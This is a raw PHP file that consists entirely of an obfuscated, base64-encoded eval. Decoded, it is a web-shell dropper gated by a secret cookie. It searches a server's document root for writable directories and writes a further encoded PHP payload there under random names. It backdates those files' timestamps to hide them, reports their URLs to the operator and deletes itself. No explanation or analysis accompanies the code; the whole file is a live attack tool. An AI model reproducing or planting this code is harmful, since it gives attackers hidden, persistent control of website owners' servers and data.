<?php eval(base64_decode('aWYgKCFpc3NldCgkX0NPT0tJRVszNTVdKSBvciBtZDUoJF9DT09LSUVbMzU1XSkgIT0iNTNhMzAyZWU0MGQ1OTVkODUzZTRjYjJhODVlZDQ4OTQiKSBkaWUoKTsNCg0KaWYoIWRlZmluZWQoIlBIUF9FT0wiKSkNCnsNCiAgICBkZWZpbmUoIlBIUF9FT0wiLCAiXG4iKTsNCn0NCg0KaWYoIWRlZmluZWQoIkRJUkVDVE9SWV9TRVBBUkFUT1IiKSkNCnsNCiAgICBkZWZpbmUoIkRJUkVDVE9SWV9TRVBBUkFUT1IiLCAiLyIpOw0KfQ0KDQpmdW5jdGlvbiBnZW5lcmF0ZVJhbmRvbVN0cmluZygkbGVuZ3RoID0gMTApDQp7DQogICAgJGNoYXJhY3RlcnMgPSAnMDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JzsNCiAgICAkY2hhcmFjdGVyc0xlbmd0aCA9IHN0cmxlbigkY2hhcmFjdGVycyk7DQogICAgJHJhbmRvbVN0cmluZyA9ICcnOw0KICAgIGZvciAoJGkgPSAwOyAkaSA8ICRsZW5ndGg7ICRpKyspIHsNCiAgICAgICAgJHJhbmRvbVN0cmluZyAuPSAkY2hhcmFjdGVyc1tyYW5kKDAsICRjaGFyYWN0ZXJzTGVuZ3RoIC0gMSldOw0KICAgIH0NCiAgICByZXR1cm4gJHJhbmRvbVN0cmluZyAuICIucGhwIjsNCn0NCg0KJHBheWxvYWRfZmlsZSA9ICJQRDl3YUhBTkNnMEtEUXBsZG1Gc0tDSmNibHdrWkdkeVpYVnpaR2tnUFNCcGJuUjJZV3dvWDE5TVNVNUZYMThwSUNvZ016TTNPeUlwT3cwS0RRb2tZU0E5SUNJM1ZtUnlWQ3RPUjBaUU1XVnhaamxvYVVOSlkwdDNTRVpxTjBOc1NWRm9Na0prTVZZMllrbDBhRlphUXpGS2J6UnJNbEZUZG5wU01qWTNOSEpoUmk4NU5IcEVhemM0UjB4UGIzVTFWelpWYnpKTk4xcHNlbm96TTAxdVZITXpTbnA2WjFSemVWTnNjMkUyTnpSRFNWaHFhRkpQZEZFNU5XWllNWHB2TDFjckwwbGlhRTlPWjJwTlQxTnJjVUp4VW1KdVptWndkbU5RZFcxaWRFbGxRbWMwUTJaa1drRlJaRTFQZFdnME0wOWtTa3MxTWxGbU0wdDVVMkZPU1dnMk56UjJjWGhYVWtGNmRrWm5MMWQ0Y1VoQmNFY3pVMnh3VGxvd00ydzFZeTkyYW5OcVRrTmFUazUzZW01dVJHeG9kMEZpU0RKVlpYbERkbGN4ZWtZdmNsSTBWVFZvT1hwM2NIbERaa0p1VkVOb1RVOUVTbFVyYjNSRUswaG9jRWxwVDJzNGNHMUNPSFUwVWs1TU5qYzBhVnBoZW5CRVJ6ZE5RakpTYzNkT1VqWjVNVkpsYjJSc1drbHpUblpNWVhaMk5qYzBlSGxWZEhWS00wcDFlVmQxU1hkTmVIcEVTUzl5TVRoa1RqVkNZVUp0TjNKRFptTnVSa2hLT0d4MFJsVk9hMWRFU2xGblUydGFTSFpxSzNaVGJtNHlLMDA0VDBwek9IWnlhU3RxVWl0bE1sbFpWamNyZGxScU9XTmxaVGwyWW1zMU4ySTJOVmhhZUdaWWFIWklSRXc1TjJzNVZ5OXVOemswTWsxdEszRkNjMEZhUm05NVkwOUNOamMwT0cxTlUzQmpMMmhIVTA1WmFuUlRXVGxCWTJ0bVIySkxjMUZaV25Gd2VFdHlTRVkyTnpSMVpYbzFZMWgyTXpac1JITkNlVWxoVEZKUFlVOVpSRWRxZDNBelYyZzNiVmxSVW0wcldIZFRWbEpQY25sTFZrNWplVXRrTDB3MlpYRnNkRmh0YkhOS2VHVmFWbnBNU1RJcmJYSTBNaTlZZHpaYU1EWTRSMUJ2T0dwMlNHUmhhMWx6YWtSNlYydFJTSGhRUkc5TlFsVXlXVmwxWTJsWVIwMTFMMHhXZGtSSVJuQk9RWEI0ZHpseVEwZFVOMjg1YTIxVVNIbEdRbEJNV1dneEwzWXhRemR4VjIwMlZubHpOREZqTTJoaGVYVTJkV2xDVEhwa2FIUnRPRE5tTlRBMVNuSnpVRzFIUW1ST2FVcHhTMEVyTjBFdlJrdERUemRpWmtrM1NGaHRaRVIxVmxVemVscHVaRE52YkU4NVZHaExTUzl6TmpjME0yTnhWMjFYT1RWWWVEUk1TM2haWkdOelZsTmFWV0pFZFhWSlpYSTVUbTh4ZFU1NmFsYzBPQzlDUVdSc2NXeDJWalp6VUZJeWFXcGpXa3g1YldOU1J6bE5XbGN3V0dwSFZESmplalkzTkdGVVYyTm5iV1pFWVVzMGJrRXdSM3BPVGpFNGJHZFJRMjloYm5FdmRYQXdURkZxTmpGalJscEpVR2h5VDJ0SmFHRjJaVXBKVjJoaWQwTTRTbVZYTUdOWVIwbDNNMlVyUmpaNFIyeFJjWEY1YVhSUmJUWXhZVXR1WkVGWVoxTlVZVTFzTmpjMEsydFBaVUUwWlhJclIyRnpaQzlrVFhwUlJtdE1ibFJWU2padFoyeFBVQzk1YTB4bmFGSlZWV0Z2TWpjNWIyNXdka3RLU1ZKRFJtdEplVEIxTldaUk5XcExTek5sVG1zeksxcDJkRkpaVlZNeGRIcFNRazlMUkZSV2JrZ3lkbEJuU2s1R2MxQlZNV1JuVm1wUllVZFpOVU5uUzBJeFFrWjBWVWxYTjNjME5qYzBOVlZITmpjMFRqVnRhV2xvVkVSR1RtRnFWWE5STW5Oc09HODBablZMZW1Gb1UyMXFaVEk1YzBGMGJuaHJPR2xDWVVwM2NtWm9XV3A0YlVscGRYUnRLMFpyTmtjeFUzVTNhaXRsTUdKdVl5c3ZMMEZQUjBKWFpuRXlUM0ZUU0hOYU5UZ3lhVmhEV0djclJFSTNhR1kwWmpSUE9YazJOelEyTnpSMWNtY3ZiMUZSVVM5RVpFeGlUa0puWjNkUWFVaFJTa000U1VoUGEwWnBRVVJrYUdkQlJ6WTNORUZaWjBKcVFVZFJRVnBSUW0xSVNtRlpWRUZwV2xWblR6WTNORlJCYVZvMk56UkVTamM1Wm1GWlNVUk9RbHB2VEUxb1JrdHlWM3BaVGtsQmRHdEdjMmR6YTBaclozTjVRbXRSWTJsRGEwRlZhRWN3Y0hRMFIzcG5ZazlyVEdORVduZE9ia1F5Y1hoTGFFUlROamMwWWxGcU1FazVZamRoV2xCdFpqaExjMm94UmxZNVNXbHdZVEpwYlZOSk5Va3haSFYxZVRKRFpEWndaV05tY0cxb1JqYzBlbE5sU25NeVltRnNjekp6WW1ScldqSkNWa3R5YzBGcFZsSnFaRkYxTm1RMlptNHJkbXMyUVdkaWRrdzFUR3MxWm5OWmNGUXdZVFkzTkZWV1NqZFVPRzlqUjBSQ1lYVlRiSFIzVFVadU5tUnZOWGt3YVZaSFNsWmtiMXBXTjNod1Iza3JTVUYyTkRsclNsbHBSbTEyY0daRVVrMWFXVTAyTnpSWmVYWmxWbXg2WVRKSE5pc3hTR0o2Y3pKM00xTTNXV1ptUVVoVWNscGxZV0p5TTFrNVJISm9TamgyTDNOak1uSkxabU5aTmtkVmFVaGFUM1V5WjNjek0xRlFSRW95Vm1SWVJHODFVSE5pY0hCc1REY3hTa3h6UkRsSlprMDJOMU4wUXpZM05HbFFVMFJzVUZwT1duWmlaak12UjJGVFRWSTBVVmM1TTBKYWFpdEVNVzFhYTBSa1ltWWlPdzBLSkdFZ1BTQnpkSEpmY21Wd2JHRmpaU2drWkdkeVpYVnpaR2tzSUNKRklpd2dKR0VwT3cwS1pYWmhiQ0FvWjNwcGJtWnNZWFJsS0dKaGMyVTJORjlrWldOdlpHVW9KR0VwS1NrNyI7DQokcGF5bG9hZF9uYW1lID0gIiI7DQoNCnNyYW5kKHRpbWUoKSk7DQoNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KZnVuY3Rpb24gY29tcGFyZXIoJGEsICRiKQ0Kew0KICAgIHJldHVybiBzdHJsZW4oJGEpLXN0cmxlbigkYik7DQp9DQoNCmlmICghZnVuY3Rpb25fZXhpc3RzKCdmaWxlX3B1dF9jb250ZW50cycpKSB7DQogICAgZnVuY3Rpb24gZmlsZV9wdXRfY29udGVudHMoJGZpbGVuYW1lLCAkZGF0YSkgew0KICAgICAgICAkZiA9IEBmb3BlbigkZmlsZW5hbWUsICd3Jyk7DQogICAgICAgIGlmICghJGYpIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRieXRlcyA9IGZ3cml0ZSgkZiwgJGRhdGEpOw0KICAgICAgICAgICAgZmNsb3NlKCRmKTsNCiAgICAgICAgICAgIHJldHVybiAkYnl0ZXM7DQogICAgICAgIH0NCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEdldFBhdGhEaWZmKCRiYXNlX3BhdGgsICRmdWxsX3BhdGgpDQp7DQogICAgJHBvcyA9IHN0cnBvcygkZnVsbF9wYXRoLCAkYmFzZV9wYXRoKTsNCg0KICAgIGlmICgkcG9zID09PSBGQUxTRSkNCiAgICB7DQogICAgICAgIHJldHVybiBGQUxTRTsNCiAgICB9DQoNCiAgICByZXR1cm4gc3Vic3RyKCRmdWxsX3BhdGgsICRwb3MgKyBzdHJsZW4oJGJhc2VfcGF0aCkpOw0KfQ0KDQpmdW5jdGlvbiBHZXRXcml0YWJsZURpcnMoKQ0Kew0KICAgICRyZXMgPSBBcnJheSgpOw0KDQogICAgJGFuYWx5c3lzX3F1ZXVlID0gQXJyYXkoKTsNCg0KICAgICRhbmFseXN5c19xdWV1ZVtdID0gR2V0RG9jUm9vdCgpOw0KDQogICAgJHNlbGZfcGF0aCA9ICRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXTsNCiAgICB3aGlsZSAoKCRzbGFzaCA9IHN0cnJwb3MoJHNlbGZfcGF0aCwgRElSRUNUT1JZX1NFUEFSQVRPUikpICE9PSBGQUxTRSkNCiAgICB7DQogICAgICAgICRzZWxmX3BhdGggPSBzdWJzdHIoJHNlbGZfcGF0aCwgMCwgJHNsYXNoKTsNCg0KICAgICAgICBpZiAoJHNlbGZfcGF0aCA9PSBHZXREb2NSb290KCkpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKHN0cmxlbigkc2VsZl9wYXRoKSkNCiAgICAgICAgew0KICAgICAgICAgICAgJGFuYWx5c3lzX3F1ZXVlW10gPSAkc2VsZl9wYXRoOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgZm9yZWFjaCAoJGFuYWx5c3lzX3F1ZXVlIGFzICRjdXJyZW50X2RpcikNCiAgICB7DQogICAgICAgIGlmICghaW5fYXJyYXkoJGN1cnJlbnRfZGlyLCAkcmVzKSkNCiAgICAgICAgew0KICAgICAgICAgICAgJHJlcyA9IGFycmF5X21lcmdlKCRyZXMsIEdldERpcmVjdG9yeUxpc3QoJGN1cnJlbnRfZGlyKSk7DQogICAgICAgIH0NCiAgICB9DQogICAgJHJlcyA9IGFycmF5X21lcmdlKCRhbmFseXN5c19xdWV1ZSwgJHJlcyk7DQoNCiAgICByZXR1cm4gQ2hlY2tXcml0YWJsZShhcnJheV91bmlxdWUoJHJlcykpOw0KfQ0KDQpmdW5jdGlvbiBDaGVja1dyaXRhYmxlKCRkaXJfbGlzdCkNCnsNCiAgICAkZGlyX2xpc3Rfd3JpdGFibGUgPSBBcnJheSgpOw0KDQogICAgZm9yZWFjaCAoJGRpcl9saXN0IGFzICRkaXIpDQogICAgew0KICAgICAgICBpZiAoQGlzX3dyaXRhYmxlKCRkaXIpID09IFRSVUUpDQogICAgICAgIHsNCiAgICAgICAgICAgICRkaXJfbGlzdF93cml0YWJsZVtdID0gJGRpcjsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHJldHVybiAkZGlyX2xpc3Rfd3JpdGFibGU7DQp9DQoNCmZ1bmN0aW9uIEdldERpcmVjdG9yeUxpc3QoJGRpciwgJGRlcHRoPTEwMDApDQp7DQoNCiAgICAkcmVzdWx0ID0gYXJyYXkoKTsNCiAgICAkZGlyX2NvdW50ID0gMDsNCg0KICAgIGlmICgkZGVwdGggPT0gMCkNCiAgICB7DQogICAgICAgIHJldHVybiAkcmVzdWx0Ow0KICAgIH0NCg0KICAgICRkaXIgPSBzdHJsZW4oJGRpcikgPT0gMSA/ICRkaXIgOiBydHJpbSgkZGlyLCAnXFwvJyk7DQogICAgJGggPSBAb3BlbmRpcigkZGlyKTsNCiAgICBpZiAoJGggPT09IEZBTFNFKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuICRyZXN1bHQ7DQogICAgfQ0KDQogICAgd2hpbGUgKCgkZiA9IHJlYWRkaXIoJGgpKSAhPT0gRkFMU0UpDQogICAgew0KICAgICAgICBpZiAoJGYgIT09ICcuJyBhbmQgJGYgIT09ICcuLicpDQogICAgICAgIHsNCiAgICAgICAgICAgICRjdXJyZW50X2RpciA9ICIkZGlyLyRmIjsNCiAgICAgICAgICAgIGlmIChpc19kaXIoJGN1cnJlbnRfZGlyKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkZGlyX2NvdW50ICs9IDE7DQoNCiAgICAgICAgICAgICAgICBpZiAoJGRpcl9jb3VudCA+PSAkZGVwdGgpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAkcmVzdWx0W10gPSAkY3VycmVudF9kaXI7DQogICAgICAgICAgICAgICAgJHJlc3VsdCA9IGFycmF5X21lcmdlKCRyZXN1bHQsIEdldERpcmVjdG9yeUxpc3QoJGN1cnJlbnRfZGlyLCAkZGVwdGggLyAxMCkpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgY2xvc2VkaXIoJGgpOw0KDQogICAgcmV0dXJuICRyZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIEdldERvY1Jvb3QoKQ0Kew0KICAgICRkb2Nyb290X2VuZCA9IHN0cnJwb3MoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddLCAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSk7DQogICAgaWYgKCRkb2Nyb290X2VuZCA9PT0gRkFMU0UpDQogICAgew0KICAgICAgICByZXR1cm4gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsNCiAgICB9DQogICAgZWxzZWlmICgkZG9jcm9vdF9lbmQgPT09IDApDQogICAgew0KICAgICAgICByZXR1cm4gIi8iOw0KICAgIH0NCiAgICBlbHNlDQogICAgew0KICAgICAgICByZXR1cm4gc3Vic3RyKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSwgMCwgJGRvY3Jvb3RfZW5kKTsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEdldFBheWxvYWQoJHBheWxvYWQpDQp7DQogICAgJGN1cnJlbnRfcGF5bG9hZCA9IGJhc2U2NF9kZWNvZGUoJHBheWxvYWQpOw0KDQogICAgcmV0dXJuICRjdXJyZW50X3BheWxvYWQ7DQp9DQoNCmZ1bmN0aW9uIFdyaXRlUGF5bG9hZCgkcGF0aCwgJHBheWxvYWQpDQp7DQogICAgaWYgKCFmaWxlX2V4aXN0cygkcGF0aCkpDQogICAgew0KICAgICAgICBpZiAoZmlsZV9wdXRfY29udGVudHMoJHBhdGgsIEdldFBheWxvYWQoJHBheWxvYWQpKSAhPSBGQUxTRSkNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuIFRSVUU7DQogICAgICAgIH0NCg0KICAgIH0NCg0KICAgIHJldHVybiBGQUxTRTsNCn0NCg0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KIyBnZXQgYmFzZSBsb2NhbCBhbmQgcmVtb3RlIHBhdGgNCiRiYXNlX3d3d19wYXRoID0gJGhvc3QgPSBAJF9TRVJWRVJbJ0hUVFBfSE9TVCddOw0KJGJhc2VfbG9jYWxfcGF0aCA9IEdldERvY1Jvb3QoKTsNCg0KaWYgKCEoJGJhc2VfbG9jYWxfcGF0aF90aW1lID0gQHN0YXQoJGJhc2VfbG9jYWxfcGF0aC4iLy5odGFjY2VzcyIpKSkNCnsNCiAgICBpZiAoISgkYmFzZV9sb2NhbF9wYXRoX3RpbWUgPSBAc3RhdCgkYmFzZV9sb2NhbF9wYXRoLiIvaW5kZXgucGhwIikpKQ0KICAgIHsNCiAgICAgICAgaWYgKCEoJGJhc2VfbG9jYWxfcGF0aF90aW1lID0gQHN0YXQoJGJhc2VfbG9jYWxfcGF0aC4iL2luZGV4Lmh0bWwiKSkpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICghKCRiYXNlX2xvY2FsX3BhdGhfdGltZSA9IEBzdGF0KCRiYXNlX2xvY2FsX3BhdGguIi8uLiIpKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoISgkYmFzZV9sb2NhbF9wYXRoX3RpbWUgPSBAc3RhdCgkYmFzZV9sb2NhbF9wYXRoKSkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAkYmFzZV9sb2NhbF9wYXRoX3RpbWUgPSBBcnJheSgpOw0KICAgICAgICAgICAgICAgICAgICAkYmFzZV9sb2NhbF9wYXRoX3RpbWVbJ210aW1lJ10gPSB0aW1lKCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0KDQokYmFzZV9sb2NhbF9wYXRoX3RpbWUgPSAkYmFzZV9sb2NhbF9wYXRoX3RpbWVbJ210aW1lJ107DQoNCiRkaXJfbGlzdF93cml0YWJsZSA9IEdldFdyaXRhYmxlRGlycygpOw0KDQppZiAoY291bnQoJGRpcl9saXN0X3dyaXRhYmxlKSA9PSAwKQ0Kew0KICAgIGVjaG8gIlVSTCNTVEFUVVNfVU5XUklUQUJMRSI7DQogICAgdW5saW5rKCJKd2xzamRfYmFhcWlmZy5waHAiKTsNCiAgICBleGl0KCk7DQp9DQoNCnVzb3J0KCRkaXJfbGlzdF93cml0YWJsZSwgJ2NvbXBhcmVyJyk7ICMgc29ydCBkaXJlY3RvcnkgYnkgbGVuDQoNCiRsaXN0X3dyaXRhYmxlID0gQXJyYXkoKTsNCiRsaXN0X3dyaXRhYmxlW10gPSAkZGlyX2xpc3Rfd3JpdGFibGVbMF07DQokbGlzdF93cml0YWJsZVtdID0gJGRpcl9saXN0X3dyaXRhYmxlW3JhbmQoMCxzaXplb2YoJGRpcl9saXN0X3dyaXRhYmxlKSldOw0KJGdvb2QgPSBGQUxTRTsNCiRnb29kX2NvdW50ZXIgPSAwOw0KIyB0cnkgdG8gdXBsb2FkDQokbWF4X3RyeWVzID0gc3RybGVuKCRwYXlsb2FkX25hbWUpID09IDAgPyA1IDogMTsNCmZvcmVhY2ggKCRsaXN0X3dyaXRhYmxlIGFzICRjdXJyZW50X2RpcikNCnsNCiAgICAvLyBpZiBwYXlsb2FkIG5hbWUgaXMgc2V0LCBubyBtb3JlIG9uZSB0cnkgdG8gdXBsb2FkIG9uIGN1cnJlbnQgZGlyDQogICAgLy9mb3IgKCRpPTA7ICRpIDwgJG1heF90cnllczsgJGkrKykNCiAgICB7DQogICAgICAgIGlmIChzdHJsZW4oJHBheWxvYWRfbmFtZSkgPT0gMCkNCiAgICAgICAgew0KICAgICAgICAgICAgJHRlbXBfcGF5bG9hZF9uYW1lID0gZ2VuZXJhdGVSYW5kb21TdHJpbmcoKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgICR0ZW1wX3BheWxvYWRfbmFtZSA9ICRwYXlsb2FkX25hbWU7DQogICAgICAgIH0NCg0KICAgICAgICAkZnVsbF9wYXlsb2FkX25hbWUgPSAkY3VycmVudF9kaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHRlbXBfcGF5bG9hZF9uYW1lOw0KDQogICAgICAgICR1cmlfcGF0aCA9IEdldFBhdGhEaWZmKCRiYXNlX2xvY2FsX3BhdGgsICRmdWxsX3BheWxvYWRfbmFtZSk7DQogICAgICAgIGlmIChzdHJwb3MoJHVyaV9wYXRoLCAkdGVtcF9wYXlsb2FkX25hbWUpID09PSBmYWxzZSkNCiAgICAgICAgew0KICAgICAgICAgICAgJHVyaV9wYXRoID0gJHVyaV9wYXRoIC4gIi8iICAuICR0ZW1wX3BheWxvYWRfbmFtZTsNCiAgICAgICAgfQ0KICAgICAgICAkZnVsbF91cmkgPSAkYmFzZV93d3dfcGF0aCAuIChzdHJwb3MoJHVyaV9wYXRoLCAiLyIpID09IDAgPyAkdXJpX3BhdGggOiAiLyIuJHVyaV9wYXRoKTsNCg0KICAgICAgICBpZiAoV3JpdGVQYXlsb2FkKCRmdWxsX3BheWxvYWRfbmFtZSwgJHBheWxvYWRfZmlsZSkpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRvdWNoKCRmdWxsX3BheWxvYWRfbmFtZSwgJGJhc2VfbG9jYWxfcGF0aF90aW1lKTsgLy8gc2V0IGxhc3QgbW9kaWZpY2F0aW9uIHRpbWUgYXMgcm9vdCBmb2xkZXINCiAgICAgICAgICAgIGNobW9kKCRmdWxsX3BheWxvYWRfbmFtZSwgMDc1NSk7DQogICAgICAgICAgICBlY2hvICJCUlVSTCNodHRwOi8vIiAuICRmdWxsX3VyaSAuIFBIUF9FT0w7DQogICAgICAgICAgICAkZ29vZD1UUlVFOw0KICAgICAgICAgICAgJGdvb2RfY291bnRlcisrOw0KICAgICAgICAgICAgaWYgKCRnb29kX2NvdW50ZXIgPjEpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdW5saW5rKCJKd2xzamRfYmFhcWlmZy5waHAiKTsNCiAgICAgICAgICAgICAgICBlY2hvICIjQ0NDVVJMIjsNCiAgICAgICAgICAgICAgICBleGl0KCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQp9DQppZighJGdvb2QpDQogICAgZWNobyAiVVJMI1NUQVRVU19DQU5UVVBMT0FEI0NDQ1VSTCI7DQplY2hvICIjQ0NDVVJMIjsNCnVubGluaygiSndsc2pkX2JhYXFpZmcucGhwIik7DQpleGl0KCk7'));